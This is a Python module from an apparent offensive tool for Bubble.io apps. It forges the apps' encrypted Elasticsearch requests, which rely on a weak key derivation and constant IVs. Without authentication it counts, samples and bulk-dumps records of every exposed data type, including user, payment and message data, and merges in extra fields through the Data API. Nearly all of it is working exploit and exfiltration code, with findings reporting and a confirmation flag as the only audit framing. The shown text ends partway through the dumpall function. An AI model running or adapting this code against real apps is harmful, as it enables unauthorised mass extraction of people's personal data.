"""ES audit module — Tier 0 crypto exploit + Tier 1 privacy-rule checks.

Three subcommands:
  - ``analyze``  : count records per type anonymously via ``/aggregate``
                   (optional: ``--compare`` anon vs auth to catch always-true /
                   empty-equals-empty rules, ``--field-leak`` to dump visible
                   ``_source`` keys per type).
  - ``dumpone T``: paginate ``/search`` on a single type until ``at_end`` and
                   write one JSONL file.
  - ``dumpall``  : run ``analyze`` then ``dumpone`` on every exposed type.
                   Gated behind ``--confirm``.

Flags shared across subcommands:
  --appname X      Override the Bubble app slug (default: ``ctx.schema.env_name``)
  --app-version V  ``live`` (default) or ``test``
  --branch B       ``live`` or ``test`` (URL branch, independent of app_version)
  --endpoint E     ``aggregate`` | ``search`` (switch for analyze; dumps always use search)
  --batch          Use ``/maggregate`` to batch count requests
  --compare        Also query authenticated (needs ``ctx.session``)
  --field-leak     Dump one record per exposed type to list visible fields
  --auth           Force authenticated requests for dumpone/dumpall
  --confirm        Required for ``dumpall``
"""
from __future__ import annotations

import json
import re
import time
from pathlib import Path
from typing import Any, Optional

from bubblepwn.bubble.api import BubbleAPI
from bubblepwn.bubble.es import payload as pl
from bubblepwn.bubble.es.transport import EsTransport
from bubblepwn.bubble import name_normalize as nn
from bubblepwn.bubble.parse.meta import parse_meta
from bubblepwn.context import Context, Finding
from bubblepwn.modules.base import Module, parse_flags, register
from bubblepwn.ui import console, panel, progress_iter


def _normalize_type(raw: str) -> str:
    """Accept 'custom.foo', 'foo' or 'user' → canonical form for ES payloads."""
    if raw == "user" or raw.startswith("custom.") or raw.startswith("option."):
        return raw
    return f"custom.{raw}"


_SAFE_SEGMENT_RE = re.compile(r"[^A-Za-z0-9._-]")


def _safe_path_segment(name: str) -> str:
    """Sanitise a user-supplied string for use as a filename.

    Only ``[A-Za-z0-9._-]`` survives; `..`, leading dots, empty results and
    path separators (``/``, ``\\``, ``:``) are rejected. Raises ``ValueError``
    on unsafe input so callers fail loudly instead of writing outside
    ``out/``.
    """
    cleaned = _SAFE_SEGMENT_RE.sub("_", name)
    if not cleaned or cleaned == "." or cleaned == ".." or cleaned.startswith("."):
        raise ValueError(f"unsafe name: {name!r}")
    if set(cleaned) == {"_"}:
        raise ValueError(f"unsafe name: {name!r}")
    return cleaned


# ── Per-type severity classifier ────────────────────────────────────────
#
# Rules (strict narrowing, critical reserved for true PII / credentials):
#
#   critical
#     - a field visible in `_source` contains a PII fragment
#       (email, phone, ssn, password, token, iban, siret, stripe, card_, ...)
#     - OR the type name is a strict PII/credentials noun
#       (`user`, `customer`, `employee`, `personnel`, `profile`,
#        `credential`, `password`, `payment`, `invoice`, `billing`,
#        `subscription`, `kyc`, `passport`,
#        `message`, `conversation`, `chat` — user-private content)
#
#   high
#     - the type name is a sensitive business noun
#       (`document`, `report`, `contract`, `upload`, `email`, `comment`,
#        `token`, `reset`, `organization`, `tenant`, `permission`,
#        `role`, `acl`, `audit`, `log`, `transaction`, `order`, `client_`)
#     - OR record count ≥ 1000 (bulk data is sensitive regardless of label)
#
#   medium (with "may be legitimately public" warning)
#     - anything else with record_count > 0
#
# Meta / reference / enum prefixes are NEVER escalated on name alone
# (``type_client`` is "types of client", not customer records).

_NAME_META_PREFIXES = (
    "type_", "role_", "status_", "kind_", "category_", "tag_",
    "secteur_", "theme_", "thematique_",
)

_NAME_CRITICAL = (
    "user", "customer", "member", "employee", "personnel", "staff",
    "profile",
    "credential", "password",
    "payment", "invoice", "billing", "subscription",
    "identity", "kyc", "passport",
    # user-private content
    "message", "conversation", "chat",
)

_NAME_HIGH = (
    "document", "report", "contract", "file", "upload",
    "email", "comment",
    "token", "reset", "verif",
    "organization", "company", "tenant", "workspace",
    "permission", "role", "acl", "privilege",
    "audit", "log", "event",
    "transaction", "order", "client_",
)

_FIELD_PII = (
    "mail", "phone", "ssn", "dob", "birth",
    "password", "token", "secret", "apikey", "api_key",
    "siret", "iban", "stripe", "card_",
    "passport", "address",
)


def _name_has(name: str, pattern: str) -> bool:
    """`name_has("custom.user_123", "user")` → True.

    Matches as a whole underscore-separated token, or as a substring only
    for long patterns (≥ 7 chars) to avoid false positives.
    """
    parts = name.split("_")
    if pattern in parts:
        return True
    if len(pattern) >= 7 and pattern in name:
        return True
    return False


def classify_type_severity(
    raw_type: str, record_count: int, fields_visible: list[str]
) -> tuple[str, str, bool]:
    """Return ``(severity, reason, may_be_legitimate)``.

    ``may_be_legitimate`` is True only for medium findings that do not hit
    any of the critical / high name or field patterns — the module appends
    a reminder to the finding detail so the reviewer checks manually
    before reporting.
    """
    name = raw_type.lower().replace("custom.", "")

    # 1) Visible PII fields → always critical
    if fields_visible:
        for f in fields_visible:
            lf = f.lower()
            for pat in _FIELD_PII:
                if pat in lf:
                    return (
                        "critical",
                        f"PII-like field visible in `_source`: `{f}`",
                        False,
                    )

    # 2) Check for meta / reference / enum prefixes first — these should
    # NOT escalate on name alone.
    is_meta = any(name.startswith(prefix) for prefix in _NAME_META_PREFIXES)

    # 3) Strict critical name patterns
    if not is_meta:
        for pat in _NAME_CRITICAL:
            if _name_has(name, pat):
                return (
                    "critical",
                    f"type name matches PII pattern `{pat}`",
                    False,
                )

    # 4) High: sensitive business noun
    for pat in _NAME_HIGH:
        if _name_has(name, pat):
            return (
                "high",
                f"type name matches elevated pattern `{pat}`",
                False,
            )

    # 5) High: bulk exposure
    if record_count >= 1000:
        return (
            "high",
            f"{record_count} records exposed — bulk data leakage",
            False,
        )

    # 6) Medium: exposed but may be legitimate
    if record_count > 0:
        return (
            "medium",
            f"{record_count} record(s) exposed",
            True,
        )

    return "info", "no records", False


@register
class EsAudit(Module):
    name = "es-audit"
    description = (
        "Bubble Elasticsearch crypto exploit (PBKDF2-MD5x7 + constant IVs "
        "`po9`/`fl1`). Probe, analyze, dump, forge, decrypt"
    )
    needs_auth = False
    category = "exploit"
    subcommands = (
        ("probe", "forge one encrypted /elasticsearch/aggregate call and "
                  "verify the target accepts the envelope"),
        ("analyze", "`msearch` every known type once to detect which ones "
                    "are exposed + classify severity (critical PII vs "
                    "reference tables)"),
        ("dumpone <type>", "paginate every record of a single type via "
                           "/elasticsearch/msearch into a JSONL file"),
        ("dumpall", "dumpone, but for every type that analyze flagged "
                    "as readable — requires --confirm"),
        ("sqlite [path]", "rebuild a SQLite DB from dumpall's JSONL, "
                          "auto-resolving Bubble __LOOKUP__ joins"),
        ("query <endpoint> '<json>'", "send an arbitrary JSON payload to "
                                      "/elasticsearch/<endpoint> (pure crypto "
                                      "tunnel — good for manual PoCs)"),
        ("encrypt '<json>' [--appname slug]", "offline: emit the {y, x, z} "
                                              "triple for the given JSON "
                                              "(no network call)"),
        ("decrypt <y> <x> <z> --appname slug", "offline: reverse a captured "
                                               "triple back to JSON (no "
                                               "network call)"),
    )
    flags = (
        ("--compare", "analyze: diff anon-reachable types vs "
                      "authenticated session to surface privacy-rule holes"),
        ("--field-leak", "analyze: also dump 1 sample record per "
                         "readable type so field names / PII columns "
                         "show up in the finding"),
        ("--batch", "analyze: use /elasticsearch/maggregate (multi-"
                    "aggregate) instead of /msearch — one request for all "
                    "types, much faster"),
        ("--branch test", "target the /version-test/ branch (dev)"),
        ("--endpoint aggregate|search", "analyze: which ES endpoint to "
                                        "exploit (default: search)"),
        ("--type <name>", "analyze / dumpone / sqlite: restrict the "
                          "operation to a single data type (bypasses the "
                          "full schema iteration)"),
        ("--types t1,t2", "analyze / dumpall: restrict the operation to a "
                          "comma-separated list of types"),
        ("--confirm", "authorize dumpall — without it the subcommand "
                      "refuses to run (can exfiltrate GBs)"),
        ("--auth", "use the current `session` cookies — records the "
                   "authenticated user can see vs. anon"),
        ("--batch-size <N>", "dumpone / dumpall: records per page "
                             "(default: 500)"),
        ("--max <N>", "dumpone / dumpall: cap the total records pulled "
                      "per type"),
        ("--appname <slug>", "override app slug for encrypt / decrypt "
                             "(default: fingerprint-detected)"),
        ("--sqlite", "dumpall: also build the SQLite DB at the end "
                     "(implies `sqlite` subcommand after the dump)"),
        ("--enrich", "dumpone / dumpall / sqlite: after each ES hit, also "
                     "fetch /api/1.1/obj/<type>/<_id> and merge the two "
                     "records. The Data API applies a different privacy "
                     "pipeline than ES — the union exposes more fields."),
        ("--enrich-concurrency <N>", "dumpone / dumpall: parallel Data API "
                                     "fetches during enrichment (default: 8)"),
    )
    example = "run es-audit analyze --type user --field-leak"

    async def run(self, ctx: Context, **kwargs: Any) -> None:
        argv: list[str] = kwargs.get("argv", [])
        flags, positional = parse_flags(argv)
        sub = positional[0].lower() if positional else "analyze"

        # Pure-crypto utilities — no target / no network needed.
        if sub == "decrypt":
            self._decrypt_triple(flags, positional)
            return
        if sub == "encrypt":
            self._encrypt_payload(flags, positional, ctx)
            return

        if ctx.target is None:
            console.print("[red]No target set.[/] Use `target <url>` first.")
            return

        appname = str(flags.get("appname") or ctx.schema.env_name or "")
        if not appname:
            console.print(
                "[red]Cannot determine appname.[/] "
                "Run `run fingerprint` first or pass `--appname X`."
            )
            return
        app_version = str(flags.get("app_version") or ctx.schema.app_version or "live")
        branch = "test" if str(flags.get("branch", "")).lower() == "test" else "live"

        anon = EsTransport(ctx.target.url, appname, cookies=None, branch=branch)
        auth: Optional[EsTransport] = None
        if ctx.session and ctx.session.cookies:
            auth = EsTransport(
                ctx.target.url, appname,
                cookies=ctx.session.cookies, branch=branch,
            )

        if sub == "probe":
            await self._probe(ctx, anon, auth, app_version)
        elif sub == "analyze":
            await self._analyze(ctx, anon, auth, app_version, flags)
        elif sub == "dumpone":
            # Accept either a positional type or `--type <name>` — the flag
            # form keeps dumpone consistent with analyze / dumpall / sqlite.
            type_name: Optional[str] = None
            if len(positional) >= 2:
                type_name = positional[1]
            elif isinstance(flags.get("type"), str):
                type_name = str(flags["type"]).strip() or None
            if not type_name:
                console.print(
                    "[red]usage:[/] run es-audit dumpone <type>  "
                    "(or --type <name>)"
                )
                return
            await self._dumpone(ctx, anon, auth, app_version, type_name, flags)
        elif sub == "dumpall":
            if not flags.get("confirm"):
                console.print(
                    "[red]dumpall is destructive (high data volume).[/] "
                    "Pass `--confirm` to proceed."
                )
                return
            await self._dumpall(ctx, anon, auth, app_version, flags)
            if flags.get("sqlite"):
                await self._sqlite(ctx, positional, flags, anon=anon, auth=auth)
        elif sub == "query":
            await self._query(ctx, anon, auth, positional, flags)
        elif sub == "sqlite":
            await self._sqlite(ctx, positional, flags, anon=anon, auth=auth)
        else:
            console.print(
                f"[red]unknown subcommand:[/] {sub}  "
                "(probe|analyze|dumpone|dumpall|sqlite|query|encrypt|decrypt)"
            )

    # ── probe ────────────────────────────────────────────────────────────

    async def _probe(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
    ) -> None:
        """Send a single forged /aggregate count request to prove the exploit."""
        panel(
            "es-audit — probe",
            (
                f"Sending one forged [bold]/elasticsearch/aggregate[/] request "
                f"with [cyan]X-Bubble-Appname: {anon.appname}[/] "
                f"(branch={anon.branch}). A 200 response with a `count` field "
                "proves the crypto envelope is accepted and the endpoint is "
                "reachable without auth."
            ),
            style="cyan",
        )
        candidate = "user"
        for raw in sorted(ctx.schema.types.keys()):
            candidate = raw
            break
        body = pl.build_aggregate_count(anon.appname, candidate, app_version=app_version)
        status, resp = await anon.request("aggregate", body)
        console.print(f"[bold]type      [/] [cyan]{candidate}[/]")
        console.print(f"[bold]status    [/] {status}")
        console.print(f"[bold]response  [/] {resp}")

        if status == 200 and isinstance(resp, dict) and "count" in resp:
            ctx.add_finding(Finding(
                module=self.name,
                severity="critical",
                title="Bubble Elasticsearch crypto envelope accepted",
                detail=(
                    f"`/elasticsearch/aggregate` returned a valid count for "
                    f"type `{candidate}` using only the public "
                    f"`X-Bubble-Appname` header. No authentication required. "
                    "Any data type without a correct privacy rule is "
                    "readable by anyone."
                ),
                data={
                    "type": candidate,
                    "count": resp.get("count"),
                    "appname": anon.appname,
                    "branch": anon.branch,
                },
            ))
            console.print(
                f"\n[bold red]✓ exploit confirmed[/] — "
                f"{resp.get('count')} record(s) counted on `{candidate}` "
                "without authentication."
            )
        else:
            console.print(
                "\n[yellow]exploit inconclusive[/] — endpoint responded but "
                "no `count` field; try `run es-audit analyze` for the full sweep."
            )

    # ── query ────────────────────────────────────────────────────────────

    async def _query(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        positional: list[str],
        flags: dict[str, Any],
    ) -> None:
        """Send an arbitrary encrypted payload to any ES endpoint."""
        if len(positional) < 3:
            console.print(
                "[red]usage:[/] run es-audit query <endpoint> '<json payload>'  "
                "(endpoint: aggregate|search|msearch|maggregate|mget|bulk_watch)"
            )
            return
        endpoint = positional[1]
        payload_raw = positional[2]
        try:
            payload = json.loads(payload_raw)
        except json.JSONDecodeError as exc:
            console.print(f"[red]invalid JSON payload:[/] {exc}")
            return
        transport = auth if (flags.get("auth") and auth) else anon
        panel(
            f"es-audit — query /elasticsearch/{endpoint}",
            f"appname={transport.appname}  ·  branch={transport.branch}  ·  "
            f"auth={'yes' if transport is auth else 'no'}",
            style="cyan",
        )
        status, resp = await transport.request(endpoint, payload)
        console.print(f"[bold]status[/] {status}")
        body = (
            json.dumps(resp, indent=2, ensure_ascii=False, default=str)
            if not isinstance(resp, str) else resp
        )
        if len(body) > 4000:
            body = body[:4000] + "\n... (truncated)"
        console.print(body)

    # ── decrypt / encrypt utilities ──────────────────────────────────────

    def _decrypt_triple(
        self, flags: dict[str, Any], positional: list[str]
    ) -> None:
        """Decrypt a captured {y, x, z} triple. No target/network needed."""
        from bubblepwn.bubble.es.crypto import unwrap_triple

        appname = str(flags.get("appname") or "")
        if not appname:
            console.print(
                "[red]usage:[/] run es-audit decrypt --appname <slug> <y> <x> <z>  "
                "(y,x,z are the base64 fields from a captured request body)"
            )
            return
        if len(positional) < 4:
            console.print(
                "[red]usage:[/] run es-audit decrypt --appname <slug> <y> <x> <z>"
            )
            return
        y, x, z = positional[1], positional[2], positional[3]
        try:
            ts, iv, pt = unwrap_triple(appname, {"y": y, "x": x, "z": z})
        except Exception as exc:
            console.print(f"[red]decryption failed:[/] {exc}")
            return
        panel(
            "es-audit — decrypt",
            (
                f"appname={appname}\n"
                f"timestamp={ts.decode('utf-8', errors='replace')}\n"
                f"iv_material={iv.decode('utf-8', errors='replace')}"
            ),
            style="cyan",
        )
        try:
            parsed = json.loads(pt)
            console.print(json.dumps(parsed, indent=2, ensure_ascii=False))
        except json.JSONDecodeError:
            console.print(pt.decode("utf-8", errors="replace"))

    def _encrypt_payload(
        self,
        flags: dict[str, Any],
        positional: list[str],
        ctx: Context,
    ) -> None:
        """Encrypt an arbitrary JSON payload into a {y, x, z} triple."""
        from bubblepwn.bubble.es.crypto import wrap_triple

        appname = str(flags.get("appname") or ctx.schema.env_name or "")
        if not appname:
            console.print(
                "[red]usage:[/] run es-audit encrypt --appname <slug> '<json payload>'"
            )
            return
        if len(positional) < 2:
            console.print(
                "[red]usage:[/] run es-audit encrypt [--appname <slug>] '<json payload>'"
            )
            return
        payload_raw = positional[1]
        try:
            parsed = json.loads(payload_raw)
        except json.JSONDecodeError as exc:
            console.print(
                f"[red]invalid JSON payload:[/] {exc}\n"
                "[dim]hint: the payload must be valid JSON. "
                'Wrap strings in quotes (e.g. \'"hello"\') or pass an object '
                '(e.g. \'{"k":"v"}\').[/]'
            )
            return
        body_bytes = json.dumps(parsed, separators=(",", ":")).encode("utf-8")
        triple = wrap_triple(appname, body_bytes)
        panel(
            "es-audit — encrypt",
            f"appname={appname}  ·  payload_size={len(body_bytes)}B",
            style="cyan",
        )
        console.print(json.dumps(triple, indent=2))

    # ── analyze ──────────────────────────────────────────────────────────

    async def _analyze(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
        flags: dict[str, Any],
    ) -> None:
        # Resolve the target type list. Priority:
        #   1. `--type <name>` — single-type mode (most common for focused audits).
        #   2. `--types a,b,c` — comma-separated subset.
        #   3. all types in ctx.schema.
        explicit_one = flags.get("type")
        explicit_many = flags.get("types")
        if isinstance(explicit_one, str) and explicit_one.strip():
            types = [explicit_one.strip()]
        elif isinstance(explicit_many, str) and explicit_many.strip():
            types = [t.strip() for t in explicit_many.split(",") if t.strip()]
        else:
            types = sorted(ctx.schema.types.keys())
        if not types:
            console.print(
                "[yellow]No types available.[/] Run `run datatypes` first, or "
                "pass `--type <name>` / `--types a,b,c` explicitly."
            )
            return

        compare = bool(flags.get("compare")) and auth is not None
        field_leak = bool(flags.get("field_leak"))
        endpoint = str(flags.get("endpoint") or "aggregate").lower()
        use_maggregate = bool(flags.get("batch")) and endpoint == "aggregate"

        panel(
            "ES audit — analyze",
            f"appname={anon.appname}  ·  branch={anon.branch}  ·  "
            f"types={len(types)}  ·  endpoint={endpoint}  ·  "
            f"compare={compare}  ·  field_leak={field_leak}  ·  batch={use_maggregate}",
            style="cyan",
        )

        # Count anonymously
        if use_maggregate:
            counts_anon = await self._batch_count(anon, app_version, types)
        else:
            counts_anon = await self._sequential_count(
                anon, app_version, types, endpoint
            )

        counts_auth: dict[str, Optional[int]] = {}
        if compare:
            console.print("[cyan]→[/] re-running with authenticated cookies…")
            if use_maggregate:
                counts_auth = await self._batch_count(auth, app_version, types)  # type: ignore[arg-type]
            else:
                counts_auth = await self._sequential_count(
                    auth, app_version, types, endpoint  # type: ignore[arg-type]
                )

        leaked_fields: dict[str, list[str]] = {}
        if field_leak:
            for t in types:
                if (counts_anon.get(t) or 0) > 0:
                    leaked_fields[t] = await self._probe_fields(anon, app_version, t)

        self._render_analyze(types, counts_anon, counts_auth, leaked_fields, compare)
        self._push_findings_analyze(ctx, counts_anon, counts_auth, leaked_fields)

    async def _sequential_count(
        self,
        transport: EsTransport,
        app_version: str,
        types: list[str],
        endpoint: str,
    ) -> dict[str, Optional[int]]:
        results: dict[str, Optional[int]] = {}
        with progress_iter(f"/{endpoint} counts", len(types)) as bar:
            for t in types:
                tname = _normalize_type(t)
                bar.set_description(f"/{endpoint} · {tname[:40]}")
                count = None
                if endpoint == "aggregate":
                    body = pl.build_aggregate_count(
                        transport.appname, tname, app_version=app_version
                    )
                    status, resp = await transport.request("aggregate", body)
                    if status == 200 and isinstance(resp, dict) and "count" in resp:
                        count = int(resp["count"])
                else:  # fallback: search with large n to estimate
                    body = pl.build_search(
                        transport.appname, tname, app_version=app_version, n=1000
                    )
                    status, resp = await transport.request("search", body)
                    if status == 200 and isinstance(resp, dict):
                        hits = (resp.get("hits") or {}).get("hits") or []
                        count = len(hits) if resp.get("at_end") else max(len(hits), 1000)
                results[t] = count
                bar.advance()
        return results

    async def _batch_count(
        self, transport: EsTransport, app_version: str, types: list[str]
    ) -> dict[str, Optional[int]]:
        # maggregate accepts a list of aggregate payloads
        normalized = [_normalize_type(t) for t in types]
        body = pl.build_maggregate_counts(
            transport.appname, normalized, app_version=app_version
        )
        status, resp = await transport.request("maggregate", body)
        results: dict[str, Optional[int]] = {t: None for t in types}
        if status != 200 or not isinstance(resp, dict):
            console.print(f"[yellow]maggregate failed (status={status}) — falling back[/]")
            return await self._sequential_count(transport, app_version, types, "aggregate")
        responses = resp.get("responses") or []
        if len(responses) != len(types):
            console.print(
                f"[yellow]maggregate response count mismatch "
                f"({len(responses)}/{len(types)}) — falling back[/]"
            )
            return await self._sequential_count(transport, app_version, types, "aggregate")
        for t, r in zip(types, responses):
            if isinstance(r, dict) and "count" in r:
                results[t] = int(r["count"])
        return results

    async def _probe_fields(
        self, transport: EsTransport, app_version: str, raw_type: str
    ) -> list[str]:
        tname = _normalize_type(raw_type)
        body = pl.build_search(transport.appname, tname, app_version=app_version, n=1)
        status, resp = await transport.request("search", body)
        if status != 200 or not isinstance(resp, dict):
            return []
        hits = (resp.get("hits") or {}).get("hits") or []
        if not hits:
            return []
        source = hits[0].get("_source") or {}
        return sorted(source.keys())

    def _render_analyze(
        self,
        types: list[str],
        anon: dict[str, Optional[int]],
        auth: dict[str, Optional[int]],
        leaks: dict[str, list[str]],
        compare: bool,
    ) -> None:
        from rich.table import Table

        table = Table(header_style="bold cyan", border_style="dim")
        table.add_column("Type", style="cyan", no_wrap=True, overflow="fold")
        table.add_column("Count anon", justify="right")
        if compare:
            table.add_column("Count auth", justify="right")
            table.add_column("Δ", justify="right", style="magenta")
        if leaks:
            table.add_column("Fields visible (anon)", overflow="fold", style="dim")
        table.add_column("Verdict", style="bold")

        total_exposed = 0
        total_records = 0
        for t in types:
            a = anon.get(t)
            row = [t, "-" if a is None else f"{a}"]
            if compare:
                b = auth.get(t)
                row.append("-" if b is None else f"{b}")
                if a is not None and b is not None:
                    row.append(f"{b - a:+d}" if b != a else "=")
                else:
                    row.append("?")
            if leaks:
                row.append(",".join(leaks.get(t, [])[:8]) or "")
            if a is not None and a > 0:
                row.append("[red]EXPOSED[/]")
                total_exposed += 1
                total_records += a
            elif a == 0:
                row.append("[green]empty/denied[/]")
            else:
                row.append("[yellow]error[/]")
            table.add_row(*row)
        console.print(table)
        console.print(
            f"\n[bold]Summary:[/] {total_exposed} exposed type(s) · "
            f"{total_records} record(s) total visible anonymously"
        )

    def _push_findings_analyze(
        self,
        ctx: Context,
        anon: dict[str, Optional[int]],
        auth: dict[str, Optional[int]],
        leaks: dict[str, list[str]],
    ) -> None:
        exposed = [(t, c) for t, c in anon.items() if c is not None and c > 0]
        if not exposed:
            return

        total = sum(c for _, c in exposed)
        biggest = sorted(exposed, key=lambda x: -x[1])[:5]

        # 1) Summary finding — always critical when any type leaks.
        ctx.add_finding(Finding(
            module=self.name,
            severity="critical",
            title=(
                f"ES crypto bypass confirmed: {len(exposed)} type(s) leaking "
                f"{total} record(s) anonymously"
            ),
            detail=(
                "Anonymous reads succeed via /elasticsearch/aggregate using "
                "only the public `X-Bubble-Appname` header. Biggest exposures: "
                + ", ".join(f"`{t}`({c})" for t, c in biggest)
            ),
            data={"types": exposed, "total_records": total},
        ))

        # 2) Per-type finding — severity classified by type name + fields.
        for t, count in exposed:
            fields = leaks.get(t) or []
            sev, reason, may_be_legit = classify_type_severity(
                t, count, fields
            )
            detail_bits = [
                f"{count} record(s) readable via `/elasticsearch/aggregate` "
                "without authentication.",
                f"Severity: **{sev}** — {reason}.",
            ]
            if fields:
                shown = ", ".join(f"`{f}`" for f in fields[:12])
                more = f" (+{len(fields) - 12} more)" if len(fields) > 12 else ""
                detail_bits.append(f"Fields visible in `_source`: {shown}{more}.")
            if may_be_legit:
                detail_bits.append(
                    "⚠ **May be legitimately public** — review manually "
                    "before reporting. Common benign cases: reference / "
                    "lookup tables, option-set mirrors, i18n dictionaries, "
                    "feature-flag registries. Flag as a real leak only if "
                    "the records contain business or user data."
                )
            ctx.add_finding(Finding(
                module=self.name,
                severity=sev,
                title=f"`{t}` readable anonymously — {count} record(s)",
                detail="\n\n".join(detail_bits),
                data={
                    "type": t,
                    "count": count,
                    "fields_visible": fields[:30],
                    "severity_reason": reason,
                    "may_be_legitimate": may_be_legit,
                },
            ))

        # 3) Tautology / empty-equals-empty suspects (authed comparison).
        for t in anon:
            a, b = anon.get(t), auth.get(t)
            if a is None or b is None:
                continue
            if a > 0 and a == b:
                ctx.add_finding(Finding(
                    module=self.name,
                    severity="high",
                    title=f"Privacy rule tautology suspect on `{t}` ({a})",
                    detail=(
                        "Identical record count for anonymous and "
                        "authenticated sessions suggests an always-true rule "
                        "or an empty-equals-empty comparison."
                    ),
                    data={"type": t, "count": a},
                ))

    # ── dump ─────────────────────────────────────────────────────────────

    async def _dumpone(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
        target_type: str,
        flags: dict[str, Any],
    ) -> None:
        use_auth = bool(flags.get("auth")) and auth is not None
        transport = auth if use_auth else anon
        raw_type = _normalize_type(target_type)
        n_per = int(flags.get("batch_size", 1000))
        max_total = int(flags.get("max", 1_000_000))

        out_dir = Path("out") / ctx.target.host / "es"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_name = _safe_path_segment(raw_type)
        out_file = out_dir / f"{safe_name}.jsonl"

        total = 0
        from_ = 0
        started = time.monotonic()
        with out_file.open("w", encoding="utf-8") as fh:
            with console.status(
                f"[cyan]dumping[/] {raw_type} → {out_file.name}", spinner="dots"
            ) as status_widget:
                while total < max_total:
                    body = pl.build_search(
                        transport.appname, raw_type,
                        app_version=app_version, n=n_per, from_=from_,
                    )
                    status, resp = await transport.request("search", body)
                    if status != 200 or not isinstance(resp, dict):
                        console.print(
                            f"\n[red]stopped at from={from_}[/]  status={status}  "
                            f"body={str(resp)[:200]}"
                        )
                        break
                    hits = (resp.get("hits") or {}).get("hits") or []
                    for h in hits:
                        fh.write(json.dumps(h, ensure_ascii=False) + "\n")
                        total += 1
                    from_ += len(hits)
                    elapsed = time.monotonic() - started
                    rate = total / elapsed if elapsed > 0 else 0.0
                    status_widget.update(
                        f"[cyan]dumping[/] {raw_type} — "
                        f"{total:,} records · [dim]{rate:.0f} rec/s[/]"
                    )
                    if resp.get("at_end") or not hits:
                        break

        console.print(
            f"[green]✓[/] {total} records · {raw_type} → [cyan]{out_file}[/]"
        )

        # Optional: enrich with /api/1.1/obj/<type>/<_id>. Separate pass so
        # an interrupted enrichment doesn't lose the raw ES dump.
        enriched = 0
        enriched_field_gains = 0
        if flags.get("enrich") and total > 0:
            cookies = ctx.session.cookies if (use_auth and ctx.session) else None
            api = BubbleAPI(
                ctx.target.url,
                cookies=cookies,
                branch=transport.branch,
            )
            concurrency = int(flags.get("enrich_concurrency") or 8)
            meta_map = _build_meta_map_from_schema(ctx, raw_type)
            # No /meta data? Run it now so we get Bubble's authoritative
            # id↔display mapping before the per-record merge.
            if not meta_map:
                meta_map = await _fetch_meta_map(api, raw_type)
            enriched, enriched_field_gains = await _enrich_jsonl_with_dataapi(
                out_file, raw_type, api,
                concurrency=concurrency, meta_map=meta_map,
            )

        ctx.add_finding(Finding(
            module=self.name,
            severity="high" if total > 0 and not use_auth else "info",
            title=(
                f"Dumped {total} records from {raw_type}"
                + (" [anon]" if not use_auth else " [auth]")
                + (f" · enriched {enriched}" if enriched else "")
            ),
            data={
                "type": raw_type,
                "count": total,
                "file": str(out_file),
                "auth": use_auth,
                "enriched_records": enriched,
                "enrich_field_gains": enriched_field_gains,
            },
        ))
        if flags.get("enrich") and enriched:
            console.print(
                f"[green]✓[/] enriched {enriched}/{total} record(s) · "
                f"+{enriched_field_gains} field(s) gained via Data API merge"
            )

        # Schema disparity: fields Bubble advertises in /meta but that
        # never surface in the dump (even after enrichment) are almost
        # always privacy-redacted — the field names themselves leak which
        # attributes the app tracks, which is useful recon.
        self._emit_schema_disparity_finding(ctx, raw_type, out_file)

    def _emit_schema_disparity_finding(
        self, ctx: Context, raw_type: str, out_file: Path,
    ) -> None:
        # Look up the type's /meta-declared fields. If datatypes --probe
        # never ran, there's nothing to compare against — silently skip.
        t = ctx.schema.types.get(raw_type)
        if not t or not t.fields:
            return
        meta_fields = [
            f for f in t.fields.values() if f.source == "meta" and f.raw
        ]
        if not meta_fields:
            return

        # Scan the dump (fast — at most a few MB per line of .keys()).
        observed_keys: set[str] = set()
        try:
            with out_file.open("r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        rec = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    if not isinstance(rec, dict):
                        continue
                    enrich = rec.get("_enrich")
                    if isinstance(enrich, dict) and isinstance(
                        enrich.get("merged"), dict
                    ):
                        observed_keys.update(enrich["merged"].keys())
                    src = rec.get("_source")
                    if isinstance(src, dict):
                        observed_keys.update(src.keys())
        except OSError:
            return

        hidden: list[tuple[str, str, str]] = []
        for mf in meta_fields:
            # A /meta field is 'seen' when any observed key matches
            # either its DB id or its display name (via name_normalize).
            if mf.raw in observed_keys:
                continue
            disp = mf.display or mf.name
            if disp in observed_keys:
                continue
            if any(nn.match(mf.raw, obs) for obs in observed_keys):
                continue
            if disp and any(nn.match(disp, obs) for obs in observed_keys):
                continue
            hidden.append((mf.raw, disp or mf.name, mf.type))

        if not hidden:
            return

        details = "\n".join(
            f"  • {disp}  ({mf_id}, {mf_type})" for mf_id, disp, mf_type in hidden[:30]
        )
        more = f"\n  …and {len(hidden) - 30} more" if len(hidden) > 30 else ""
        ctx.add_finding(Finding(
            module=self.name,
            severity="info",
            title=(
                f"{len(hidden)} field(s) in /meta but never returned by "
                f"{raw_type} dump — privacy-redacted or unset"
            ),
            detail=(
                "These fields are declared in the Bubble schema (/api/1.1/"
                "meta) but were absent from every dumped record. Likely "
                "either (a) fully blocked by privacy rules so no user "
                "profile ever carries them, or (b) only populated on a "
                "record subset we didn't hit. The field names themselves "
                "leak internal schema — useful recon.\n" + details + more
            ),
            data={
                "type": raw_type,
                "hidden_fields": [
                    {"id": mf_id, "display": disp, "type": mf_type}
                    for mf_id, disp, mf_type in hidden
                ],
            },
        ))

    async def _dumpall(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
        flags: dict[str, Any],
    ) -> None:
        explicit_one = flags.get("type")
        explicit_many = flags.get("types")
        if isinstance(explicit_one, str) and explicit_one.strip():
            types = [explicit_one.strip()]
        elif isinstance(explicit_many, str) and explicit_many.strip():
            types = [t.strip() for t in explicit_many.split(",") if t.strip()]
        else:
            types = sorted(ctx.schema.types.keys())
        if not types:
            console.print("[yellow]No types in schema.[/] Run `run datatypes` first.")
            return

        console.print(f"[cyan]→[/] discovering exposed types ({len(types)} candidates)…")
        counts = await self._sequential_count(anon, app_version, types, "aggregate")
        exposed = [(t, c) for t, c in counts.items() if c and c > 0]
        total_est = sum(c for _, c in exposed)
        console.print(
            f"[bold]Will dump {len(exposed)} types · ~{total_est:,} records total[/]"
        )
        n = len(exposed)
